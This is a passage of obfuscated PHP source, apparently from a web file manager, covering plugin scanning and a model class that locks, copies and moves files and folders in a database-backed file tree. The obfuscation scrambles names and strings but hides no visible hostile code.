($ú¤’…½Ğ == !1) { $á›ãñø‹ = array(); $ú¤’…½Ğ = $this->getConfigDefault($¥Ê¶£òÃ); } foreach ($ú¤’…½Ğ as $Øñ„¿ => $ñ³èÓø¢) { $á›ãñø‹[$Øñ„¿] = is_string($ñ³èÓø¢) ? trim($ñ³èÓø¢) : $ñ³èÓø¢; } $this->update($ù¯è¦»Ñ[$©î”[452]], array($©î”[16] => $á›ãñø‹)); } public function viewList() { $ÂÊ§³Ôú =& $_SERVER[ú÷îèÆÜ]; $ÕÃç¬£  = $this->loadList(); $this->pluginScan($ÕÃç¬£ ); $ÕÃç¬£  = $this->loadPluginList(); $ÕÑÔ”Á¯ = array(); foreach ($ÕÃç¬£  as $ÉÌŒÄçÛ => $¥©€ˆ¶) { unset($¥©€ˆ¶[$ÂÊ§³Ôú[2004]], $¥©€ˆ¶[$ÂÊ§³Ôú[16]]); $—¥ÅĞõ = PLUGIN_DIR . $¥©€ˆ¶[$ÂÊ§³Ôú[42]] . $ÂÊ§³Ôú[2006]; if (!is_file($—¥ÅĞõ)) { continue; } $ÇèîÄÎ = Hook::apply($¥©€ˆ¶[$ÂÊ§³Ôú[42]] . $ÂÊ§³Ôú[2014]); if (is_array($ÇèîÄÎ)) { $ÕÑÔ”Á¯[$ÉÌŒÄçÛ] = array_merge($¥©€ˆ¶, $ÇèîÄÎ); } } return $ÕÑÔ”Á¯; } private function loadPluginList() { $­ÀÓï÷Ö =& $_SERVER[ú÷îèÆÜ]; $ö…áÕÃš = $this->loadList(); if (strtolower(MOD) == $­ÀÓï÷Ö[2015]) { return $ö…áÕÃš; } $äŒ¼°”Ô = Hook::trigger($­ÀÓï÷Ö[2016], $ö…áÕÃš); if ($ö…áÕÃš && !$äŒ¼°”Ô) { die; } return $äŒ¼°”Ô ? $äŒ¼°”Ô : $ö…áÕÃš; } private function pluginScan($¹¹ø¹¬×) { $ÔÙĞğÇ„ =& $_SERVER[ú÷îèÆÜ]; recursion_dir(PLUGIN_DIR, $Ó÷¬¸°, $£°„†‘Æ, 0); foreach ($Ó÷¬¸° as $î˜Òï€”) { $¹Âì„ØÍ = get_path_this($î˜Òï€”); if (isset($¹¹ø¹¬×[$¹Âì„ØÍ]) || !file_exists($î˜Òï€” . $ÔÙĞğÇ„[2017]) || !file_exists($î˜Òï€” . $ÔÙĞğÇ„[2006])) { continue; } Hook::apply($¹Âì„ØÍ . $ÔÙĞğÇ„[2011]); } } } goto BÈöÊ…†­»; BÍàÙÄŠöÕ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($èŞŒúÕÖ) { $æÎœœ¢Ä =& $_SERVER[ú÷îèÆÜ]; if (!$this->allowLock()) { return; } $this->_lockCheck($æÎœœ¢Ä[595], $èŞŒúÕÖ); $¸íç¢ŠÈ = 1; $this->_lockEvent($èŞŒúÕÖ, array($æÎœœ¢Ä[596], $æÎœœ¢Ä[597]), $¸íç¢ŠÈ); $this->_lockParent($èŞŒúÕÖ, array($æÎœœ¢Ä[597]), $¸íç¢ŠÈ); $this->_lockEvent($èŞŒúÕÖ, array($æÎœœ¢Ä[598], $æÎœœ¢Ä[599]), $¸íç¢ŠÈ); $this->_lockCheckEnd($æÎœœ¢Ä[595], $èŞŒúÕÖ); } public function lockCopyEnd($Ÿ¿½‰À¥) { $Â°Øâí¡ =& $_SERVER[ú÷îèÆÜ]; if (!$this->allowLock()) { return; } $¡¹Ÿ…ßá = 0; $this->_lockEvent($Ÿ¿½‰À¥, array($Â°Øâí¡[596], $Â°Øâí¡[597]), $¡¹Ÿ…ßá); $this->_lockParent($Ÿ¿½‰À¥, array($Â°Øâí¡[597]), $¡¹Ÿ…ßá); $this->_lockEvent($Ÿ¿½‰À¥, array($Â°Øâí¡[598], $Â°Øâí¡[599]), $¡¹Ÿ…ßá); } public function lockWriteStart($ÉŒ‡ÀÚŠ, $ú–ó×ÄÙ = '') { $§ÊñŒ¢ =& $_SERVER[ú÷îèÆÜ]; if (!$this->allowLock()) { return; } $this->_lockCheck($§ÊñŒ¢[596], $ÉŒ‡ÀÚŠ); $Ëì˜‹ = 1; $this->_lockKey($§ÊñŒ¢[600] . $ÉŒ‡ÀÚŠ . $§ÊñŒ¢[20] . $ú–ó×ÄÙ, $Ëì˜‹); $this->_lockEvent($ÉŒ‡ÀÚŠ, array($§ÊñŒ¢[595], $§ÊñŒ¢[597]), $Ëì˜‹); $this->_lockParent($ÉŒ‡ÀÚŠ, array($§ÊñŒ¢[595], $§ÊñŒ¢[597]), $Ëì˜‹); $this->_lockCheckEnd($§ÊñŒ¢[596], $ÉŒ‡ÀÚŠ); } public function lockWriteEnd($ß¥ÊÌ¤ˆ, $ñµ¤ü´† = '') { $é€ûà¤‘ =& $_SERVER[ú÷îèÆÜ]; if (!$this->allowLock()) { return; } $ğ«ìøÊè = 0; $this->_lockKey($é€ûà¤‘[600] . $ß¥ÊÌ¤ˆ . $é€ûà¤‘[20] . $ñµ¤ü´†, $ğ«ìøÊè); $this->_lockEvent($ß¥ÊÌ¤ˆ, array($é€ûà¤‘[595], $é€ûà¤‘[597]), $ğ«ìøÊè); $this->_lockParent($ß¥ÊÌ¤ˆ, array($é€ûà¤‘[595], $é€ûà¤‘[597]), $ğ«ìøÊè); } public function lockMoveStart($¸ä€Š”) { $ãÏåÉ¦Î =& $_SERVER[ú÷îèÆÜ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ãÏåÉ¦Î[597], $¸ä€Š”); $¬·ƒÏÛ¸ = 1; $this->_lockKey($ãÏåÉ¦Î[601] . $¸ä€Š”, $¬·ƒÏÛ¸); $this->_lockEvent($¸ä€Š”, array($ãÏåÉ¦Î[595], $ãÏåÉ¦Î[596]), $¬·ƒÏÛ¸); $this->_lockParent($¸ä€Š”, array($ãÏåÉ¦Î[595], $ãÏåÉ¦Î[597]), $¬·ƒÏÛ¸); $this->_lockEvent($¸ä€Š”, array($ãÏåÉ¦Î[602], $ãÏåÉ¦Î[598], $ãÏåÉ¦Î[599]), $¬·ƒÏÛ¸); $this->_lockCheckEnd($ãÏåÉ¦Î[597], $¸ä€Š”); } public function lockMoveEnd($¸ØğÈúµ) { $¯şåëÂî =& $_SERVER[ú÷îèÆÜ]; if (!$this->allowLock()) { return; } $ûç›¸½ = 0; $this->_lockKey($¯şåëÂî[601] . $¸ØğÈúµ, $ûç›¸½); $this->_lockEvent($¸ØğÈúµ, array($¯şåëÂî[595], $¯şåëÂî[596]), $ûç›¸½); $this->_lockParent($¸ØğÈúµ, array($¯şåëÂî[595], $¯şåëÂî[597]), $ûç›¸½); $this->_lockEvent($¸ØğÈúµ, array($¯şåëÂî[602], $¯şåëÂî[598], $¯şåëÂî[599]), $ûç›¸½); } private function _lockCheck($ûÎÔÃ³¨, $à ªã“€) { $‡ÔÖ®Á› =& $_SERVER[ú÷îèÆÜ]; $ÆÕ¤ªá» = $this->sourceInfo($à ªã“€); $ÈİöÛ³Æ = $ûÎÔÃ³¨ . $‡ÔÖ®Á›[20] . $à ªã“€; $this->_lockTimeStart[$ÈİöÛ³Æ] = timeFloat(); if (!is_array($ÆÕ¤ªá»)) { return; } $£“ûµˆ£ = LNG($‡ÔÖ®Á›[603]); CacheLock::setErrorMsg($‡ÔÖ®Á›[173] . htmlspecialchars($ÆÕ¤ªá»[$‡ÔÖ®Á›[42]]) . $‡ÔÖ®Á›[175] . $£“ûµˆ£); $this->_lockKey($ÈİöÛ³Æ, 1); $this->_lockKey($ÈİöÛ³Æ, 0); $„‰€¼¨ı = array_reverse($this->parentLevelArray($ÆÕ¤ªá»[$‡ÔÖ®Á›[562]])); foreach ($„‰€¼¨ı as $ŸÌ²ğºÕ) { $ÈİöÛ³Æ = $ûÎÔÃ³¨ . $‡ÔÖ®Á›[604] . $ŸÌ²ğºÕ; if (CacheLock::lockGet($‡ÔÖ®Á›[605] . $ÈİöÛ³Æ)) { $ÆÕ¤ªá» = $this->sourceInfo($ŸÌ²ğºÕ); CacheLock::setErrorMsg($‡ÔÖ®Á›[173] . htmlspecialchars($ÆÕ¤ªá»[$‡ÔÖ®Á›[42]]) . $‡ÔÖ®Á›[175] . $£“ûµˆ£); $this->_lockKey($ÈİöÛ³Æ, 1); $this->_lockKey($ÈİöÛ³Æ, 0); } } } private function _lockCheckEnd($½Çáª‰, $ç±×™­—) { $û©îŞ‡ä =& $_SERVER[ú÷îèÆÜ]; $ğŠ¶‚ßÍ = $½Çáª‰ . $û©îŞ‡ä[20] . $ç±×™­—; CacheLock::setErrorMsg($û©îŞ‡ä[431]); if (!isset($this->_lockTimeStart[$ğŠ¶‚ßÍ])) { return; } $†äÆÑ”ª = timeFloat() - $this->_lockTimeStart[$ğŠ¶‚ßÍ]; unset($this->_lockTimeStart[$ğŠ¶‚ßÍ]); if ($†äÆÑ”ª > 0.5) { unset(self::$cacheSourceInfo[$û©îŞ‡ä[510] . $ç±×™­—]); } $ßÚçËÊ… = $this->sourceInfo($ç±×™­—); if (!$ßÚçËÊ…) { show_json(LNG($û©îŞ‡ä[115]), !1); } } private function _lockParent($‘¤É½Í, $áÜĞÊË¦, $À´îÍı¶) { if (!$this->autoLockSet) { return; } $ªÄ‰äº = $this->sourceInfo($‘¤É½Í); if (!is_array($ªÄ‰äº)) { return; } $Ş½Ôãèß = array_reverse($this->parentLevelArray($ªÄ‰äº[$_SERVER[ú÷îèÆÜ][562]])); foreach ($Ş½Ôãèß as $Íï©¤¼É) { $this->_lockEvent($Íï©¤¼É, $áÜĞÊË¦, $À´îÍı¶); } } private function _lockEvent($İéÆ««ß, $ıµá…­Ú, $³é­¸ÁÔ) { $úÍ‰¬ì¥ =& $_SERVER[ú÷îèÆÜ]; if (!$this->autoLockSet) { return; } foreach ($ıµá…­Ú as $¸Õã×»½) { $Ü¹ç¤æÀ = $¸Õã×»½ . $úÍ‰¬ì¥[20] . $İéÆ««ß; if ($³é­¸ÁÔ && CacheLock::lockGet($úÍ‰¬ì¥[605] . $Ü¹ç¤æÀ)) { continue; } $this->_lockKey($Ü¹ç¤æÀ, $³é­¸ÁÔ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÔØˆèø, $éöå÷¯ò = 1) { $ıÏ¨éš = $_SERVER[ú÷îèÆÜ][605] . md5($ÔØˆèø); if ($éöå÷¯ò) { if (isset(self::$_lockItemArr[$ıÏ¨éš])) { return; } self::$_lockItemArr[$ıÏ¨éš] = 1; CacheLock::lock($ıÏ¨éš, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ıÏ¨éš])) { return; } unset(self::$_lockItemArr[$ıÏ¨éš]); CacheLock::unlock($ıÏ¨éš); } } public function isParentOf($è„Ò·–â, $£·‚üÜ) { $‹ä™êöæ =& $_SERVER[ú÷îèÆÜ]; $—šœÚß = $this->sourceInfo($è„Ò·–â); $éû±¦¬ì = $this->sourceInfo($£·‚üÜ); $ÚÊãâšÆ = $—šœÚß[$‹ä™êöæ[562]] . $—šœÚß[$‹ä™êöæ[191]] . $‹ä™êöæ[60]; $Éğ Ú¿ = $éû±¦¬ì[$‹ä™êöæ[562]] . $éû±¦¬ì[$‹ä™êöæ[191]] . $‹ä™êöæ[60]; $¯éÆÃâ = strpos($Éğ Ú¿, $ÚÊãâšÆ) === 0; return $¯éÆÃâ; } private $targetIsDelete = 0; public function copy($Ÿì·³¦, $¾µÊï, $á…œ®Î€ = REPEAT_REPLACE, $şªÏÇ„ = '') { $ó²— =& $_SERVER[ú÷îèÆÜ]; $ùšŞ¢‚À = $this->sourceInfo($Ÿì·³¦); $Û•ã’İ¸ = $this->sourceInfo($¾µÊï); if (!$ùšŞ¢‚À || !$Û•ã’İ¸ || $Û•ã’İ¸[$ó²—[462]] != $ó²—[98]) { return !1; } if ($this->isParentOf($Ÿì·³¦, $¾µÊï)) { return !1; } $¬‹ÕºÙ = $şªÏÇ„ ? $şªÏÇ„ : $ùšŞ¢‚À[$ó²—[42]]; $this->lockCopyStart($Ÿì·³¦); $this->lockWriteStart($¾µÊï, $¬‹ÕºÙ); $şÜ§†¿— = array($ó²—[606] => array(), $ó²—[607] => array(), $ó²—[608] => array()); $this->targetIsDelete = intval($ùšŞ¢‚À[$ó²—[482]]); $€‚Üó‡À = $this->fileNameExistAuto($¾µÊï, $ùšŞ¢‚À); $¼Ö‡†ÇÇ = $this->_copy($Ÿì·³¦, $¾µÊï, $á…œ®Î€, $şÜ§†¿—, !0, $şªÏÇ„); $this->_childrenListClear(); $this->lockCopyEnd($Ÿì·³¦); $this->lockWriteEnd($¾µÊï, $¬‹ÕºÙ); if ($ùšŞ¢‚À[$ó²—[462]] == $ó²—[98] && $€‚Üó‡À == $¼Ö‡†ÇÇ) { $this->folderSizeResetChildren($€‚Üó‡À); } Model($ó²—[609])->addAll($şÜ§†¿—[$ó²—[607]], array(), !0); if ($€‚Üó‡À != $¼Ö‡†ÇÇ || $ùšŞ¢‚À[$ó²—[462]] == $ó²—[98]) { Model($ó²—[610])->eventCopy($¼Ö‡†ÇÇ); } $this->saveAll($şÜ§†¿—[$ó²—[608]]); Model($ó²—[224])->linkAdd($şÜ§†¿—[$ó²—[606]]); $this->folderSizeReset($¾µÊï); $this->updateModifyTime($¾µÊï); return $¼Ö‡†ÇÇ; } private function _copy($éÌØÂ¿Ü, $áÄ“êñ¾, $†ó¨³½ë, &$Ó¡õş®–, $‚—Ç«÷ä, $š¦‰ä· = '') { $™¹çò²Ë =& $_SERVER[ú÷îèÆÜ]; $åÉƒ°˜ = $this->sourceInfoCache($éÌØÂ¿Ü); $±›§³‚– = $åÉƒ°˜[$™¹çò²Ë[462]] == $™¹çò²Ë[98]; $´Âûİ¯‰ = $š¦‰ä· ? $š¦‰ä· : $åÉƒ°˜[$™¹çò²Ë[42]]; $èŸúªä = $this->fileNameExistAuto($áÄ“êñ¾, $åÉƒ°˜); if ($‚—Ç«÷ä) { $this->_childrenAllMake($éÌØÂ¿Ü); if ($±›§³‚– && $èŸúªä) { $this->_childrenAllMake($èŸúªä); } } if (!$èŸúªä) { return $this->_copyCreate($éÌØÂ¿Ü, $áÄ“êñ¾, $´Âûİ¯‰, $Ó¡õş®–); } $×Ó¨™ = $èŸúªä; if ($±›§³‚–) { if ($†ó¨³½ë == REPEAT_RENAME_FOLDER) { $´Âûİ¯‰ = $this->fileNameAutoCache($áÄ“êñ¾, $´Âûİ¯‰, $†ó¨³½ë, $±›§³‚–); $×Ó¨™ = $this->_copyCreate($éÌØÂ¿Ü, $áÄ“êñ¾, $´Âûİ¯‰, $Ó¡õş®–); } else { $¦Üï¡äæ = $this->_childrenList($éÌØÂ¿Ü); foreach ($¦Üï¡äæ as $ƒõ¬’ô‡) { $this->_copy($ƒõ¬’ô‡[$™¹çò²Ë[191]], $èŸúªä, $†ó¨³½ë, $Ó¡õş®–, !1); } } } else { if ($†ó¨³½ë == REPEAT_RENAME || $†ó¨³½ë == REPEAT_RENAME_FOLDER) { $´Âûİ¯‰ = $this->fileNameAutoCache($áÄ“êñ¾, $´Âûİ¯‰, $†ó¨³½ë, $±›§³‚–); $×Ó¨™ = $this->_copyCreate($éÌØÂ¿Ü, $áÄ“êñ¾, $´Âûİ¯‰, $Ó¡õş®–); } else { if ($†ó¨³½ë == REPEAT_REPLACE) { $ı£§­è = $this->sourceInfoCache($èŸúªä); $Œ»¿ê‹´ = $this->fileHistory($ı£§­è, $åÉƒ°˜[$™¹çò²Ë[518]], $åÉƒ°˜[$™¹çò²Ë[86]]); if ($Œ»¿ê‹´) { $Ó¡õş®–[$™¹çò²Ë[606]][] = $åÉƒ°˜[$™¹çò²Ë[518]]; } } else { if ($†ó¨³½ë == REPEAT_SKIP) { } } } Hook::trigger($™¹çò²Ë[611], array($™¹çò²Ë[612], $åÉƒ°˜, 0)); } return $×Ó¨™; } private function _copyCreate($şÃ¨¶¯, $¼ûÖ•°à, $ ÷·À¼Ö, &$Ì¬«œ—) { $ÖŞóÑ¼ =& $_SERVER[ú÷îèÆÜ]; $¢ô€ÅÊİ = $this->sourceInfoCache($şÃ¨¶¯); $ñ¨ƒ§’ = $this->sourceInfoCache($¼ûÖ•°à); $êúğ£Õ· = $this->_makeItemData($¢ô€ÅÊİ, $ñ¨ƒ§’, $ ÷·À¼Ö); Hook::trigger($ÖŞóÑ¼[613], $êúğ£Õ·); Hook::trigger($ÖŞóÑ¼[614], array($ÖŞóÑ¼[615], $êúğ£Õ·, 0)); $­£÷œª = $this->add($êúğ£Õ·); $ÙÈ…š = array($ÖŞóÑ¼[191] => $­£÷œª, $ÖŞóÑ¼[42] => $ ÷·À¼Ö); $this->_copyApplyMeta($ÙÈ…š, $Ì¬«œ—); if ($¢ô€ÅÊİ[$ÖŞóÑ¼[462]] != $ÖŞóÑ¼[98]) { $Ì¬«œ—[$ÖŞóÑ¼[606]][] = $¢ô€ÅÊİ[$ÖŞóÑ¼[518]]; return $­£÷œª; } $•ù«¾¿ = array(); $¤©ª€½ = array(); $this->_childrenListAll($şÃ¨¶¯, $•ù«¾¿); $‘¬îËˆ‚ = count($•ù«¾¿); if ($‘¬îËˆ‚ == 0) { return $­£÷œª; } $Äá€”ÂÎ = $this->sourceInfo($­£÷œª); foreach ($•ù«¾¿ as $Â¶·–½) { $ø¡¨±í³ = $this->_makeItemData($Â¶·–½, $Äá€”ÂÎ, $Â¶·–½[$ÖŞóÑ¼[42]]); $ø¡¨±í³[$ÖŞóÑ¼[562]] = $Â¶·–½[$ÖŞóÑ¼[562]]; $¤©ª€½[] = $ø¡¨±í³; } $this->chunkEventSet($ÖŞóÑ¼[616], array($ÖŞóÑ¼[617], $êúğ£Õ·, $‘¬îËˆ‚)); $this->addAll($¤©ª€½, array(), !1); $˜áşäù‡ = $this->where(array($ÖŞóÑ¼[190] => $­£÷œª))->select(); $¥ÇÍÉê» = $this->_childrenMakeRelation($•ù«¾¿, $˜áşäù‡); $¥ÇÍÉê»[$şÃ¨¶¯] = $­£÷œª; $›‘’‚¹Ó = array(); $˜âÃí¥â = array(); foreach ($˜áşäù‡ as $Â¶·–½) { $ ±¾ÒŞ· = $Â¶·–½[$ÖŞóÑ¼[191]]; $¨ƒü Ï„ = $this->_childrenMatch($¥ÇÍÉê», $Â¶·–½, $Äá€”ÂÎ); $›‘’‚¹Ó[] = array($ÖŞóÑ¼[191], $ ±¾ÒŞ·, $ÖŞóÑ¼[190], $¨ƒü Ï„[$ÖŞóÑ¼[190]]); $˜âÃí¥â[] = array($ÖŞóÑ¼[191], $ ±¾ÒŞ·, $ÖŞóÑ¼[562], $¨ƒü Ï„[$ÖŞóÑ¼[562]]); $this->_copyApplyMeta($Â¶·–½, $Ì¬«œ—); if ($Â¶·–½[$ÖŞóÑ¼[462]] != $ÖŞóÑ¼[98]) { $Ì¬«œ—[$ÖŞóÑ¼[606]][] = $Â¶·–½[$ÖŞóÑ¼[518]]; } } $this->chunkEventSet($ÖŞóÑ¼[618], array($ÖŞóÑ¼[619], $êúğ£Õ·, $‘¬îËˆ‚)); $this->saveAll($›‘’‚¹Ó); $this->chunkEventSet($ÖŞóÑ¼[620], array($ÖŞóÑ¼[621], $êúğ£Õ·, $‘¬îËˆ‚)); $this->saveAll($˜âÃí¥â); return $­£÷œª; } private function _childrenMakeRelation($óµ§ë©ï, $½î÷Ğ) { $©»èÄÁº =& $_SERVER[ú÷îèÆÜ]; $–ûÔ«’¥ = array(); $öœèÇ÷ê = array(); foreach ($óµ§ë©ï as $‘ÈùÁ—Æ) { $â½ç¾ÓÛ = $‘ÈùÁ—Æ[$©»èÄÁº[42]] . $©»èÄÁº[18] . $‘ÈùÁ—Æ[$©»èÄÁº[562]]; $–ûÔ«’¥[$â½ç¾ÓÛ] = $‘ÈùÁ—Æ[$©»èÄÁº[191]]; } foreach ($½î÷Ğ as $‘ÈùÁ—Æ) { $â½ç¾ÓÛ = $‘ÈùÁ—Æ[$©»èÄÁº[42]] . $©»èÄÁº[18] . $‘ÈùÁ—Æ[$©»èÄÁº[562]]; $˜ªÁú»¹ = $–ûÔ«’¥[$â½ç¾ÓÛ]; $öœèÇ÷ê[$˜ªÁú»¹] = $‘ÈùÁ—Æ[$©»èÄÁº[191]]; } return $öœèÇ÷ê; } private function _childrenMatch($´…ù¥ù, $î—è…“», $½ÉàÌ³ú) { $€ùìÍ¦Ü =& $_SERVER[ú÷îèÆÜ]; $àğ÷Æí¢ = $½ÉàÌ³ú[$€ùìÍ¦Ü[562]]; $„€÷‰†• = $this->parentLevelArray($î—è…“»[$€ùìÍ¦Ü[562]]); foreach ($„€÷‰†• as $Æó†çË) { if (isset($´…ù¥ù[$Æó†çË])) { $àğ÷Æí¢ .= $´…ù¥ù[$Æó†çË] . $€ùìÍ¦Ü[622]; } } $àğ÷Æí¢ = rtrim($àğ÷Æí¢, $€ùìÍ¦Ü[60]) . $€ùìÍ¦Ü[60]; $ÀóÅ’êø = $this->parentLevelArray($àğ÷Æí¢); $–îò“´Ÿ = $ÀóÅ’êø[count($ÀóÅ’êø) - 1]; return array($€ùìÍ¦Ü[190] => $–îò“´Ÿ, $€ùìÍ¦Ü[562] => $àğ÷Æí¢); } private function _makeItemData($ÉÂ±—, $ó³àŒÛµ, $±Ú×‚È™) { $ÅØ™à€§ =& $_SERVER[ú÷îèÆÜ]; $±ÙÖÆ¹ = array($ÅØ™à€§[623] => $ÉÂ±—[$ÅØ™à€§[462]], $ÅØ™à€§[471] => $±Ú×‚È™, $ÅØ™à€§[624] => $ÉÂ±—[$ÅØ™à€§[463]] ? $ÉÂ±—[$ÅØ™à€§[463]] : $ÅØ™à€§[22], $ÅØ™à€§[519] => $ÉÂ±—[$ÅØ™à€§[518]] ? $ÉÂ±—[$ÅØ™à€§[518]] : 0, $ÅØ™à€§[594] => $ÉÂ±—[$ÅØ™à€§[86]] ? $ÉÂ±—[$ÅØ™à€§[86]] : 0, $ÅØ™à€§[625] => intval($ó³àŒÛµ[$ÅØ™à€§[188]]), $ÅØ™à€§[626] => intval($ó³àŒÛµ[$ÅØ™à€§[547]]), $ÅØ™à€§[627] => intval(USER_ID), $ÅØ™à€§[628] => intval(USER_ID), $ÅØ™à€§[454] => intval($ó³àŒÛµ[$ÅØ™à€§[191]]), $ÅØ™à€§[629] => $ó³àŒÛµ[$ÅØ™à€§[562]] . $ó³àŒÛµ[$ÅØ™à€§[191]] . $ÅØ™à€§[60], $ÅØ™à€§[475] => $ÉÂ±—[$ÅØ™à€§[95]] ? $ÉÂ±—[$ÅØ™à€§[95]] : time(), $ÅØ™à€§[481] => 0, $ÅØ™à€§[630] => $ÅØ™à€§[22]); return $±ÙÖÆ¹; } private function _copyApplyMeta($ô¨™ü¹£, &$ıïŒ·¾ï) { $–©””” =& $_SERVER[ú÷îèÆÜ]; $Ôœ­ÓÖÊ = $ô¨™ü¹£[$–©”””[191]]; $Ø¼óîÓü = $ô¨™ü¹£[$–©”””[42]]; if (!isset($ô¨™ü¹£[$–©”””[631]]) || !$ô¨™ü¹£[$–©”””[631]] || $ô¨™ü¹£[$–©”””[631]] == $–©”””[222]) { $ıïŒ·¾ï[$–©”””[608]][] = array($–©”””[191], $Ôœ­ÓÖÊ, $–©”””[631], short_id($Ôœ­ÓÖÊ)); } if (Input::check($Ø¼óîÓü, $–©”””[632])) { $ıïŒ·¾ï[$–©”””[607]][] = array($–©”””[191] => $Ôœ­ÓÖÊ, $–©”””[104] => $–©”””[515], $–©”””[427] => str_replace($–©”””[63], $–©”””[22], Pinyin::get($Ø¼óîÓü))); $ıïŒ·¾ï[$–©”””[607]][] = array($–©”””[191] => $Ôœ­ÓÖÊ, $–©”””[104] => $–©”””[514], $–©”””[427] => Pinyin::get($Ø¼óîÓü, $–©”””[633])); } $ıïŒ·¾ï[$–©”””[607]][] = array($–©”””[191] => $Ôœ­ÓÖÊ, $–©”””[104] => $–©”””[494], $–©”””[427] => KodSort::makeStr($Ø¼óîÓü)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¥º±ìóƒ) { $îôï¶… =& $_SERVER[ú÷îèÆÜ]; $Ÿêµè„ø = $this->sourceInfo($¥º±ìóƒ); $½Ïõ½€î = $îôï¶…[634]; $×ıØ‡õ¼ = array($îôï¶…[562] => array($îôï¶…[589], $Ÿêµè„ø[$îôï¶…[562]] . $¥º±ìóƒ . $îôï¶…[590]), $îôï¶…[482] => $this->targetIsDelete); $”„‚“İ = $this->field($½Ïõ½€î)->where($×ıØ‡õ¼)->select(); if (!$”„‚“İ) { return; } $”„‚“İ = array_to_keyvalue($”„‚“İ, $îôï¶…[191]); foreach ($”„‚“İ as $‚ùÒÓ³ğ) { $Ïã“Ûµ = $‚ùÒÓ³ğ[$îôï¶…[190]]; $¥º±ìóƒ = $‚ùÒÓ³ğ[$îôï¶…[191]]; if (!isset($this->_childrenListCache[$¥º±ìóƒ]) && $‚ùÒÓ³ğ[$îôï¶…[462]] == $îôï¶…[98]) { $this->_childrenListCache[$¥º±ìóƒ] = array(); } if (!isset($this->_childrenListCache[$Ïã“Ûµ])) { $this->_childrenListCache[$Ïã“Ûµ] = array(); } $this->_childrenListCache[$Ïã“Ûµ][$¥º±ìóƒ] = $‚ùÒÓ³ğ; $this->_childrenItemCache[$¥º±ìóƒ] = $‚ùÒÓ³ğ; } } private function _childrenListAll($ƒÚşâ´ğ, &$Ÿ„º¹°) { $ŠÅ¯û­Ë =& $_SERVER[ú÷îèÆÜ]; if (!isset($this->_childrenListCache[$ƒÚşâ´ğ])) { return; } $ãºÖÅÎ¸ = $this->_childrenListCache[$ƒÚşâ´ğ]; foreach ($ãºÖÅÎ¸ as $äÖï¿°Ü => $Ä†ıï¨‘) { $Ÿ„º¹°[$äÖï¿°Ü] = $Ä†ıï¨‘; if ($Ä†ıï¨‘[$ŠÅ¯û­Ë[462]] == $ŠÅ¯û­Ë[98]) { $this->_childrenListAll($äÖï¿°Ü, $Ÿ„º¹°); } } } private function sourceInfoCache($Óœ”ÙŒğ) { if (isset($this->_childrenItemCache[$Óœ”ÙŒğ])) { return $this->_childrenItemCache[$Óœ”ÙŒğ]; } return $this->sourceInfo($Óœ”ÙŒğ); } private function _childrenList($”¡Ò€—ˆ) { if (isset($this->_childrenListCache[$”¡Ò€—ˆ])) { return $this->_childrenListCache[$”¡Ò€—ˆ]; } return $this->_childrenListSelect($”¡Ò€—ˆ); } private function _childrenListSelect($”‰èÅ¹) { $¶Á©Á›€ =& $_SERVER[ú÷îèÆÜ]; $•šµóöè = array($¶Á©Á›€[190] => $”‰èÅ¹, $¶Á©Á›€[482] => $this->targetIsDelete); $ùçÖÊÃ = $this->where($•šµóöè)->select(); $ùçÖÊÃ = $ùçÖÊÃ ? $ùçÖÊÃ : array(); $‰å †€ş = array_to_keyvalue($ùçÖÊÃ, $¶Á©Á›€[191]); $this->_childrenListCache[$”‰èÅ¹] = $‰å †€ş; foreach ($‰å †€ş as $”‰èÅ¹ => $ö„ßÑÓ¬) { $this->_childrenItemCache[$”‰èÅ¹] = $ö„ßÑÓ¬; } return $‰å †€ş; } private function fileNameExistAuto($…ÅöĞæï, $Æ£¾²ÀÔ) { $ãÕıã =& $_SERVER[ú÷îèÆÜ]; if ($Æ£¾²ÀÔ[$ãÕıã[482]] == $ãÕıã[98]) { return $this->fileNameExist($…ÅöĞæï, $Æ£¾²ÀÔ[$ãÕıã[42]]); } return $this->fileNameExistCache($…ÅöĞæï, $Æ£¾²ÀÔ[$ãÕıã[42]]); } private function fileNameExistCache($ÓÆ©‘, $”íªã·) { $•ò—á›ö =& $_SERVER[ú÷îèÆÜ]; $”íªã· = strtolower($”íªã·); $ššÈ°•¢ = $this->_childrenList($ÓÆ©‘); foreach ($ššÈ°•¢ as $«Şëœ÷) { if ($”íªã· == strtolower($«Şëœ÷[$•ò—á›ö[42]])) { return $«Şëœ÷[$•ò—á›ö[191]]; } } return !1; } private function fileNameAutoCache($ù¼ÄÌâÁ, $°ÒóÙş½, $ğŸ¿ê¤“, $­½½Íï) { $×Ô×úçÊ =& $_SERVER[ú÷îèÆÜ]; $Çê³†Ò½ = $this->_childrenList($ù¼ÄÌâÁ); $àı¾¤èÎ = array_to_keyvalue($Çê³†Ò½, $×Ô×úçÊ[22], $×Ô×úçÊ[42]); return $this->fileNameAutoGet($àı¾¤èÎ, $°ÒóÙş½, $ğŸ¿ê¤“, $­½½Íï); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¾Ë·‰€Œ, $Ü‹ˆ¦¢Ó, $…®ô¿·« = REPEAT_REPLACE, $¾é‘ñëş = '') { $¡ıÎÕçÍ =& $_SERVER[ú÷îèÆÜ]; $ Şêû¦ï = $this->sourceInfo($¾Ë·‰€Œ); $·ë²Ö = $this->sourceInfo($Ü‹ˆ¦¢Ó); if ($ Şêû¦ï[$¡ıÎÕçÍ[190]] == $·ë²Ö[$¡ıÎÕçÍ[191]]) { if ($ Şêû¦ï[$¡ıÎÕçÍ[482]] == $¡ıÎÕçÍ[98]) { Model($¡ıÎÕçÍ[480])->restore(array($¾Ë·‰€Œ)); } if (!$¾é‘ñëş || $¾é‘ñëş == $ Şêû¦ï[$¡ıÎÕçÍ[42]]) { return $¾Ë·‰€Œ; } } $ ÅÒÍ€å = $this->pathInfoMore($¾Ë·‰€Œ); if ($this->isParentOf($¾Ë·‰€Œ, $Ü‹ˆ¦¢Ó)) { return !1; } if (!$ Şêû¦ï || !$·ë²Ö || $·ë²Ö[$¡ıÎÕçÍ[462]] != $¡ıÎÕçÍ[98]) { return !1; } Hook::trigger($¡ıÎÕçÍ[635], $ ÅÒÍ€å); 